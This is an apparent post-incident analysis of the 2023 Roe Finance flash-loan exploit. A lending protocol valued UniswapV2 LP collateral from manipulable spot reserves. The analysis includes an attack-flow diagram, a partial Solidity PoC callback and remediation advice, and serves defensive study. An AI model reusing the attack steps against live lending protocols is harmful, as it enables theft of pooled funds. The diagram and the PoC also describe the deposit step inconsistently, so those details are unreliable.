# Roe Finance — Flash Loan LP Collateral Value Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-01-13 |
| **Protocol** | Roe Finance |
| **Chain** | Ethereum |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | [0x927b7841...](https://etherscan.io/tx/0x927b784148b60d5233e57287671cdf67d38e3e69e5b6d0ecacc7c1aeaa98985b) |
| **Vulnerable Contract** | [0x5F360c6b...](https://etherscan.io/address/0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60) |
| **Root Cause** | LP token collateral value computed from `getReserves()` spot price, allowing reserve manipulation within a single block to distort collateral valuation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/RoeFinance_exp.sol) |

---
## 1. Vulnerability Overview

Roe Finance is an Aave-based lending protocol that accepts UniswapV2 WBTC-USDC LP tokens as collateral. Because LP token value is calculated using the current pair's reserve ratio, an attacker can artificially inflate LP token value by manipulating WBTC-USDC pair liquidity via a Balancer flash loan. The attacker exploited this to borrow significantly more assets than the true collateral value warranted.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: uses spot reserves to calculate UniswapV2 LP token price
function getUnderlyingPrice(address cToken) external view returns (uint256) {
    IUniswapV2Pair pair = IUniswapV2Pair(underlying);
    (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
    uint256 totalSupply = pair.totalSupply();
    // ❌ LP token price calculated from current reserves → manipulable
    uint256 lpPrice = (reserve0 * price0 + reserve1 * price1) / totalSupply;
    return lpPrice;
}

// ✅ Fix: use the Fair LP Price formula
function getUnderlyingPrice(address cToken) external view returns (uint256) {
    // Use Alpha Finance's Fair LP Price formula:
    // sqrt(reserve0 * reserve1) * 2 * sqrt(price0 * price1) / totalSupply
    // More manipulation-resistant than simple reserve summation
}
```

### On-Chain Source Code

Source: bytecode decompilation

```solidity
// Root cause: LP token collateral value computed from getReserves() spot price, allowing reserve manipulation within a single block to distort collateral valuation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Balancer flash loan (borrow large amounts of WBTC + USDC)
  │       flashLoanAmount = 5,673,090,338,021 (in USDC units)
  │
  ├─2─▶ Add liquidity to UniswapV2 WBTC-USDC pair
  │       → LP token reserve-based price inflated
  │
  ├─3─▶ Deposit LP tokens as collateral into Roe Finance
  │       Evaluated at manipulated inflated price
  │
  ├─4─▶ Borrow large amount of roeUSDC against overvalued collateral
  │       vdUSDC debt tokens minted
  │
  ├─5─▶ Remove liquidity from UniswapV2 (redeem LP tokens)
  │
  ├─6─▶ Swap WBTC for USDC
  │
  └─7─▶ Repay Balancer flash loan → borrow proceeds kept as profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function receiveFlashLoan(
    IERC20[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
) external {
    // 1. Deposit WBTC into Roe Finance (as collateral)
    WBTC.approve(address(roe), type(uint256).max);
    roe.deposit(address(WBTC), WBTC.balanceOf(address(this)), address(this), 0);

    // 2. Approve delegation → allow debt token minting
    LP.approveDelegation(address(this), type(uint256).max);

    // 3. Borrow large amount of USDC based on manipulated LP price
    roe.borrow(address(USDC), usdcAmount, 2, 0, address(this));

    // 4. Swap WBTC for USDC
    WBTCToUSDC();

    // 5. Repay flash loan principal to Balancer
    WBTC.transfer(address(balancer), flashLoanAmount);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | LP token price oracle manipulation |
| **Attack Vector** | Flash Loan + UniswapV2 reserve manipulation |
| **Impact Scope** | Lending protocol collateral system |
| **DASP Classification** | Oracle Manipulation |
| **CWE** | CWE-20: Improper Input Validation |

## 6. Remediation Recommendations

1. **Apply Fair LP Price Formula**: A formula of the form `2 * sqrt(r0 * r1 * p0 * p1) / totalSupply` is more manipulation-resistant than simple reserve summation.
2. **Use TWAP Oracle**: Calculate LP token prices using a time-weighted average.
3. **Limit Collateral Value Spikes**: Restrict borrowing when collateral value surges sharply within a single block.

## 7. Lessons Learned

- LP token collateral is vulnerable to flash loan attacks when priced using simple reserve-based calculations.
- The Fair LP Price formula is the standard defense against such attacks.
- Aave/Compound fork protocols must design custom oracles tailored to each collateral type.